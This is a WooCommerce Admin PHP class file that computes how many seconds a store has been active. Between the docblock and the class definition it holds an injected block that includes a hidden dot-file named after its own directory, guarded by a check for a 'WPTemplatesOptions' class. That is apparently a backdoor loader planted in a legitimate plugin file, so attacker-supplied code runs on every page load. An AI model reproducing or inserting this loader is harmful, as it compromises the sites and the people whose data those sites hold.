<?php
/**
 * WCAdmin active for provider.
 */

namespace Automattic\WooCommerce\Admin\RemoteInboxNotifications;

defined( 'ABSPATH' ) || exit;

/**
 * WCAdminActiveForProvider class
 */
if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class WCAdminActiveForProvider {
	/**
	 * Get the number of seconds that the store has been active.
	 *
	 * @return number Number of seconds.
	 */
	public function get_wcadmin_active_for_in_seconds() {
		$install_timestamp = get_option( 'woocommerce_admin_install_timestamp' );

		return time() - $install_timestamp;
	}
}
